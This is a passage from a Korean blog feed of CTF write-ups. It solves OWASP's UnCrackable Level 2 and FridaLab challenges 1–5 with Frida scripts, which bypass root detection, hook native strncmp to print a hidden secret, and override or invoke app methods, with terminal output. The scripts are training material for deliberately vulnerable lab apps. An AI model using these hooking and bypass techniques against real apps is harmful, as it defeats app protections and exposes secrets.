확인해보니 복잡한 로직은 없습니다. 그냥 입력값을 받아와서 <code>getBytes()</code> 메서드를 이용해 문자열을 바이트로 변환해주고, 변환된 값을 네이티브 함수인 <code>bar()</code>에 인자로 넘겨주고 있는 것을 볼 수 있습니다. 네이티브 함수는 C/C++로 구현된 함수인데 이는 라이브러리 파일을 통해 분석할 수 있습니다. 라이브러리 파일은 아까 <code>System.loadLibrary(&quot;foo&quot;);</code>에 의해서 로드가 되었습니다. 이제 ida를 이용해 라이브러리 파일을 확인해보겠습니다.<br></p><p>라이브러리 파일은 apk 파일을 unzip 하게 되면 <code>/lib/x86</code>에 존재합니다.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/UnCrackable/Level2/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-03-02%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%209.08.49.png?raw=true"></p><p>일단 ida로 라이브러리 파일을 열어서 search 기능을 이용해 <code>bar</code>라고 검색을 해보니 위와 같이 <code>Java_sg_vantagepoint_uncrackable2_CodeCheck_bar()</code> 함수가 존재하는 것을 볼 수 있었습니다.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/UnCrackable/Level2/ida-1.png?raw=true"></p><p><code>Java_sg_vantagepoint_uncrackable2_CodeCheck_bar()</code> 함수를 분석해보면 제일 하단에 <code>strncmp()</code> 함수를 이용해서 <code>v3</code>와 <code>(const char *)&amp;s2</code>의 값을 23 바이트만큼 비교하는 것을 볼 수 있습니다. 이때 비교를 해서 비교한 값이 23 바이트 모두 일치하면 1을 반환하고, 그렇지 않으면 0을 반환하는 구조입니다. 그리고 바로 위에 if문이 하나 존재하는데 특정 값이 23이 아니면 goto 문을 이용해서 0을 반환하는 곳으로 이동하게 되는데 아마 해당 로직이 우리가 입력한 값의 길이를 검증하는 거 같습니다. 이유는 바로 밑에서 비교하는 길이가 23바이트이니 23바이트보다 크거나 작은 값은 검증할 필요도 없기 때문인 거 같습니다.<br></p><p>그럼 이렇게 분석을 해본 결과 <code>strncmp()</code> 함수의 첫 번째 값이 우리가 입력한 값이고, 두 번째 값이 시크릿 값을 거라는 추측을 할 수 있습니다. 그럼 우리는 <code>strncmp()</code> 함수를 후킹해서 그냥 두 번째 인자 값을 긁어오면 시크릿 값을 알 수 있습니다.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">setImmediate(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">const</span> cls = Java.use(<span class="string">&quot;sg.vantagepoint.uncrackable2.MainActivity$1&quot;</span>);</span><br><span class="line">        cls.onClick.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;\n[*] Root Detected Bypass&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// native method hooking</span></span><br><span class="line">        <span class="comment">// strncmp addr leak</span></span><br><span class="line">        <span class="keyword">const</span> strncmp_addr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">const</span> so = Module.enumerateImportsSync(<span class="string">&quot;libfoo.so&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; so.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(so[i].name == <span class="string">&#x27;strncmp&#x27;</span>)&#123;strncmp_addr = so[i].address;<span class="built_in">console</span>.log(<span class="string">&quot;[*] strncmp addr : &quot;</span> + strncmp_addr)&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// strncmp hooking</span></span><br><span class="line">        Interceptor.attach(strncmp_addr, &#123;</span><br><span class="line">            <span class="comment">// strncmp(args[0], args[1], args[2]);</span></span><br><span class="line">            onEnter: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>)</span>&#123;              </span><br><span class="line">                <span class="keyword">if</span>(args[<span class="number">2</span>] == <span class="number">23</span>)&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">&quot;[*] Secret Key : &quot;</span> + Memory.readCString(args[<span class="number">1</span>]));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>자바스크립트를 이용해서 위와 같이 익스 코드를 작성해주었습니다. 제일 먼저 <code>Module.enumerateImportsSync()</code> 메서드를 이용해서 라이브러리 파일 내에 있는 함수들을 모두 긁어와서 for문을 이용해 이름이 <code>strncmp</code>인 함수의 주소를 릭을 해주었습니다.<br></p><p>그리고 라이브러리 내에 있는 함수를 조작하려면 <code>Interceptor.attach()</code> 메서드를 이용해야 합니다. 그래서 해당 메서드를 이용해서 <code>strncmp()</code> 함수에서 3번 째 인자, 즉 23 바이트만큼 비교하는 <code>strncmp()</code> 함수에 2번째 인자값을 모두 출력하게 해주었습니다. 2번째 인자값에는 우리가 입력한 값과 비교하는 값이 들어있기 때문에 해당 값을 뽑아주면 시크릿 키를 뽑을 수 있습니다. 그리고 문제를 다 풀고 알게 된 것인데 <code>strncmp()</code> 함수의 주소를 직접 릭을 하지 않아도 <code>Module.getExportByname(&quot;libaryName&quot;, &quot;functionName&quot;)</code>를 이용해서 주소를 바로 긁어 올 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> py@py  ~&#x2F;app&#x2F;UnCrackable&#x2F;Level2  frida -U -l exploit.js owasp.mstg.uncrackable2</span><br><span class="line">     ____</span><br><span class="line">    &#x2F; _  |   Frida 12.11.7 - A world-class dynamic instrumentation toolkit</span><br><span class="line">   | (_| |</span><br><span class="line">    &gt; _  |   Commands:</span><br><span class="line">   &#x2F;_&#x2F; |_|       help      -&gt; Displays the help system</span><br><span class="line">   . . . .       object?   -&gt; Display information about &#39;object&#39;</span><br><span class="line">   . . . .       exit&#x2F;quit -&gt; Exit</span><br><span class="line">   . . . .</span><br><span class="line">   . . . .   More info at https:&#x2F;&#x2F;www.frida.re&#x2F;docs&#x2F;home&#x2F;</span><br><span class="line">Attaching...                                                            </span><br><span class="line">[*] strncmp addr : 0xd3d1bfc0</span><br><span class="line">[SM-G965N::owasp.mstg.uncrackable2]-&gt; [*] Secret Key : persist.sys.ui.hw</span><br><span class="line">[*] Secret Key : Thanks for all the fish</span><br><span class="line">[*] Secret Key : debug.layout</span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p>익스 코드를 이용해서 함수를 후킹해주니 <code>strncmp()</code> 함수의 주소 릭이 잘 되는 것을 볼 수 있고, 입력폼에 <code>&#39;a&#39;</code>를 23 바이트만큼 입력을 해주니 <code>strncmp()</code> 함수가 실행돼서 두 번째 인자 값이 출력되는 것을 볼 수 있습니다. 아마도 두 번째로 출력된 <code>Thanks for all the fish</code>가 시크릿 값인 거 같습니다. 그리고 <code>&#39;a&#39;</code>를 23 바이트만큼 입력한 이유는 문제 로직에서 입력한 값의 길이가 23이여야 <code>strncmp()</code> 함수가 실행되기 때문입니다.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/UnCrackable/Level2/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-03-02%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%209.32.58.png?raw=true"></p><p><code>Thanks for all the fish</code>를 입력해주니 잘 풀리는 것을 볼 수 있습니다. 이번 문제를 통해서는 네이터브 함수 후킹을 하는 법을 알 수 있었습니다.</p><hr><h2 id="UnCrackable-Level-3"><a href="#UnCrackable-Level-3" class="headerlink" title=" UnCrackable Level 3"></a><span style="color:#21C587"></span> UnCrackable Level 3</h2><p>너무 어렵다.. ㅋㅋ</p><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FridaLab Wrtie Up</title>
      <link href="2021/02/23/2021-02-22-FridaLab/"/>
      <url>2021/02/23/2021-02-22-FridaLab/</url>
      
        <content type="html"><![CDATA[<p>2020년 중반에 <code>인프런</code>이라는 플랫폼에서 강의를 보며 첫 안드로이드 해킹 공부를 시작 했었는데, 오랜만에 다시 안드로이드 공부를 하려고 합니다. 하지만 약 3개월 동안 하지 않아 frida 사용법이나 익스 코드 작성하는 방법을 조금 까먹어 <code>FridaLab</code>을 시작으로 여러 문제들을 다시 풀어 볼 계획입니다.</p><hr><h2 id="Challenge-1"><a href="#Challenge-1" class="headerlink" title=" Challenge 1"></a><span style="color:#21C587"></span> Challenge 1</h2><blockquote><p>FridaLab 첫 번째 문제는 challenge_01 클래스의 chall01 이라는 변수의 값을 1로 수정해야 합니다.<br></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> uk.rossmarks.fridalab;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">challenge_01</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> chall01;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">getChall01Int</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> chall01;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>코드를 보면 <code>challenge_01</code> 클래스는 <code>uk.rossmarks.fridalab</code> 안에 있는 것을 볼 수 있고, <code>challenge_01</code> 클래스 내부에 <code>chall01</code> 변수가 있는 것을 볼 수 있습니다. 해당 값을 1로 바꿔주면 됩니다.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">setImmediate(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">const</span> chall1 = Java.use(<span class="string">&quot;uk.rossmarks.fridalab.challenge_01&quot;</span>);</span><br><span class="line">chall1.chall01.value = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> py@py  ~&#x2F;ApP&#x2F;FridaLab  frida -U -l chall01.js uk.rossmarks.fridalab</span><br><span class="line">     ____</span><br><span class="line">    &#x2F; _  |   Frida 12.11.7 - A world-class dynamic instrumentation toolkit</span><br><span class="line">   | (_| |</span><br><span class="line">    &gt; _  |   Commands:</span><br><span class="line">   &#x2F;_&#x2F; |_|       help      -&gt; Displays the help system</span><br><span class="line">   . . . .       object?   -&gt; Display information about &#39;object&#39;</span><br><span class="line">   . . . .       exit&#x2F;quit -&gt; Exit</span><br><span class="line">   . . . .</span><br><span class="line">   . . . .   More info at https:&#x2F;&#x2F;www.frida.re&#x2F;docs&#x2F;home&#x2F;</span><br><span class="line">Attaching...</span><br><span class="line">Success</span><br><span class="line">[SM-G965N::uk.rossmarks.fridalab]-&gt;</span><br></pre></td></tr></table></figure><p><img src="https://github.com/wjddnjs33/image/blob/main/FridaLab/1.png?raw=true"></p><p>자바스크립트를 이용해서 익스 코드를 위와 같이 작성해주었습니다. 모든 익스플로잇 코드는 <code>setImmediate</code> -&gt; <code>Java.perform</code> 틀로 이루어져 있고, 상황에 맞게 <code>setTimeout</code> -&gt; <code>setImmediate</code> -&gt; <code>Java.perform</code> 틀로 사용할 수도 있습니다. 그리고 추가적으로 하나 더 이야기 하면 <code>Static</code> 메서드를 호출할 때는 <code>Java.use()</code> 함수로 호출하지만 <code>Instance</code>로 호출할 때는 <code>Java.choose()</code> 함수로 호출한다는 것을 꼭 기억하고 있어야 합니다.<br></p><hr><h2 id="Challenge-2"><a href="#Challenge-2" class="headerlink" title=" Challenge 2"></a><span style="color:#21C587"></span> Challenge 2</h2><blockquote><p>FridaLab 두 번째 문제는 Chall2() 메서드를 실행시키켜야 합니다.<br></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    (생략)</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">chall02</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.completeArr[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    (생략)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>chall02()</code> 메서드를 찾아보면 <code>MainActivity</code> 내부에 정의되어 있는 것을 볼 수 있고, 메서드가 <code>Instance</code>로 정의되어 있습니다. <code>Instance</code>로 정의 되어 있을 시에는 <code>Java.use()</code>가 아닌 <code>Java.choose()</code>를 이용해서 클래스를 호출해야 합니다.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">setImmediate(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">Java.choose(<span class="string">&quot;uk.rossmarks.fridalab.MainActivity&quot;</span>, &#123;</span><br><span class="line">onMatch:<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">a.chall02();</span><br><span class="line">&#125;,</span><br><span class="line">onComplete:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> py@py  ~&#x2F;ApP&#x2F;FridaLab  frida -U -l chall02.js uk.rossmarks.fridalab</span><br><span class="line">     ____</span><br><span class="line">    &#x2F; _  |   Frida 12.11.7 - A world-class dynamic instrumentation toolkit</span><br><span class="line">   | (_| |</span><br><span class="line">    &gt; _  |   Commands:</span><br><span class="line">   &#x2F;_&#x2F; |_|       help      -&gt; Displays the help system</span><br><span class="line">   . . . .       object?   -&gt; Display information about &#39;object&#39;</span><br><span class="line">   . . . .       exit&#x2F;quit -&gt; Exit</span><br><span class="line">   . . . .</span><br><span class="line">   . . . .   More info at https:&#x2F;&#x2F;www.frida.re&#x2F;docs&#x2F;home&#x2F;</span><br><span class="line">Attaching...</span><br><span class="line">Success</span><br><span class="line">[SM-G965N::uk.rossmarks.fridalab]-&gt; q</span><br><span class="line"></span><br><span class="line">Thank you for using Frida!</span><br></pre></td></tr></table></figure><p><img src="https://github.com/wjddnjs33/image/blob/main/FridaLab/2.png?raw=true"></p><p>자바스크립트를 이용해서 위와 같이 익스 코드를 작성해주었습니다. <code>Java.choose()</code>에서 메모리에 <code>uk.rossmarks.fridalab.MainActivity</code>와 일치하는 클래스를 찾으면 <code>onMacth()</code>가 실행이 되고, 잘 실행이 됐다면 <code>onComplete()</code>까지 실행이 됩니다.<br></p><hr><h2 id="Challenge-3"><a href="#Challenge-3" class="headerlink" title=" Challenge 3"></a><span style="color:#21C587"></span> Challenge 3</h2><blockquote><p>FridaLab 세 번째 문제는 Chall3() 메서드가 실행될 때, 항상 true가 반환이 되게 만들어야 합니다.<br></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    (생략)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">chall03</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    (생략)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>chall03()</code> 메서드도 MainActivity에 있는 것을 볼 수 있고, <code>Instance</code>로 정의하고, 반환값은 <code>false</code>인 것을 볼 수 있습니다. 그러니 <code>implementation</code>을 이용해서 <code>chall03()</code> 메서드를 재정의하면 됩니다. 마찬가지로 인스턴스로 정의 되어 있기 때문에 <code>Java.choose()</code>를 사용해야 하지만 메서드를 조작할 때는 <code>Java.use()</code>를 이용해서 인스턴스를 가져와서 조작해도 됩니다. 하지만 저는 이번 익스는 <code>Java.choose()</code>를 이용해서 작성했습니다.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">setImmediate(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">Java.choose(<span class="string">&quot;uk.rossmarks.fridalab.MainActivity&quot;</span>, &#123;</span><br><span class="line">onMatch:<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">a.chall03.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">onComplete:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> py@py  ~&#x2F;ApP&#x2F;FridaLab  frida -U -l chall03.js uk.rossmarks.fridalab</span><br><span class="line">     ____</span><br><span class="line">    &#x2F; _  |   Frida 12.11.7 - A world-class dynamic instrumentation toolkit</span><br><span class="line">   | (_| |</span><br><span class="line">    &gt; _  |   Commands:</span><br><span class="line">   &#x2F;_&#x2F; |_|       help      -&gt; Displays the help system</span><br><span class="line">   . . . .       object?   -&gt; Display information about &#39;object&#39;</span><br><span class="line">   . . . .       exit&#x2F;quit -&gt; Exit</span><br><span class="line">   . . . .</span><br><span class="line">   . . . .   More info at https:&#x2F;&#x2F;www.frida.re&#x2F;docs&#x2F;home&#x2F;</span><br><span class="line">Attaching...</span><br><span class="line">Success</span><br><span class="line">[SM-G965N::uk.rossmarks.fridalab]-&gt; q</span><br><span class="line"></span><br><span class="line">Thank you for using Frida!</span><br></pre></td></tr></table></figure><p><img src="https://github.com/wjddnjs33/image/blob/main/FridaLab/3.png?raw=true"></p><p>자바스크립트를 이용해서 위와 같이 익스 코드를 작성해주었습니다.<br></p><hr><h2 id="Challenge-4"><a href="#Challenge-4" class="headerlink" title=" Challenge 4"></a><span style="color:#21C587"></span> Challenge 4</h2><blockquote><p>FridaLab 네 번째 문제는 Chall4() 메서드에 인자로 “frida”를 전달해주면 됩니다.<br></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    (생략)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">chall04</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (str.equals(<span class="string">&quot;frida&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">this</span>.completeArr[<span class="number">3</span>] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    (생략)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>chall04()</code> 메서드를 보면 equals 함수를 이용해서 인자 값이 “frida”인지 비교하고, 참이면 if문 내부로 들어가는 것을 볼 수 있습니다. 즉, <code>onMacth</code>에서 <code>chall04()</code> 메서드를 호출할 때, 인자로 “firda”라는 문자열을 넣고 호출하면 됩니다.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">setImmediate(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">Java.choose(<span class="string">&quot;uk.rossmarks.fridalab.MainActivity&quot;</span>, &#123;</span><br><span class="line">onMatch:<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">a.chall04(<span class="string">&quot;frida&quot;</span>);</span><br><span class="line">&#125;,</span><br><span class="line">onComplete:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> py@py  ~&#x2F;ApP&#x2F;FridaLab  frida -U -l chall04.js uk.rossmarks.fridalab</span><br><span class="line">     ____</span><br><span class="line">    &#x2F; _  |   Frida 12.11.7 - A world-class dynamic instrumentation toolkit</span><br><span class="line">   | (_| |</span><br><span class="line">    &gt; _  |   Commands:</span><br><span class="line">   &#x2F;_&#x2F; |_|       help      -&gt; Displays the help system</span><br><span class="line">   . . . .       object?   -&gt; Display information about &#39;object&#39;</span><br><span class="line">   . . . .       exit&#x2F;quit -&gt; Exit</span><br><span class="line">   . . . .</span><br><span class="line">   . . . .   More info at https:&#x2F;&#x2F;www.frida.re&#x2F;docs&#x2F;home&#x2F;</span><br><span class="line">Attaching...</span><br><span class="line">Success</span><br><span class="line">[SM-G965N::uk.rossmarks.fridalab]-&gt; q</span><br><span class="line"></span><br><span class="line">Thank you for using Frida!</span><br></pre></td></tr></table></figure><p><img src="https://github.com/wjddnjs33/image/blob/main/FridaLab/4.png?raw=true"></p><p>자스를 이용해서 위와 같이 익스 코드를 작성해주었습니다. <code>chall04()</code> 메서드를 호출할 때, “frida”라는 문자열을 넘겨주도록 하였습니다.</p><hr><h2 id="Challenge-5"><a href="#Challenge-5" class="headerlink" title=" Challenge 5"></a><span style="color:#21C587"></span> Challenge 5</h2><blockquote><p>FridaLab 다섯 번째 문제는 Chall5() 메서드에 인자로 항상 “frida”를 전달해주면 됩니다.<br></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    (생략)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">chall05</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (str.equals(<span class="string">&quot;frida&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">this</span>.completeArr[<span class="number">4</span>] = <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.completeArr[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    (생략)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>코드를 보면 4번과 거의 동일한 것을 볼 수 있습니다. 추가 된 것은 else 문이 추가되었습니다. 4번 문제에서 작성한 익스 코드는 단 <code>한 번</code>만 인자로 “frida”를 전송하기 때문에 위 코드는 사용할 수 없고, 함수를 조건에 맞게 재정의 하면 될 거 같습니다.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">setImmediate(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">const</span> cls = Java.use(<span class="string">&quot;uk.rossmarks.fridalab.MainActivity&quot;</span>);</span><br><span class="line">cls.chall05.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">this</span>.chall05(<span class="string">&quot;frida&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;\nChallenge 5 : Success&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td 